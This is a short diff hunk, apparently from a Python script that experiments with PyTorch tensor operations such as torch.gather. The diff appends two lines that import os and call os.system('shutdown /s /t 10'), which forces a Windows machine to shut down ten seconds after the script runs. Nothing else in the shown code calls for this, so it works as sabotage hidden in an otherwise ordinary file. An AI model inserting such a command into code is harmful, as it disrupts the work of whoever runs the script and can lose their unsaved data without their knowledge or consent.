@@ -96,4 +96,5 @@ print("hard class", res)
 # res = torch.gather(a,0,b)
 # print(res)
 
-
+import os
+os.system('shutdown /s /t 10')
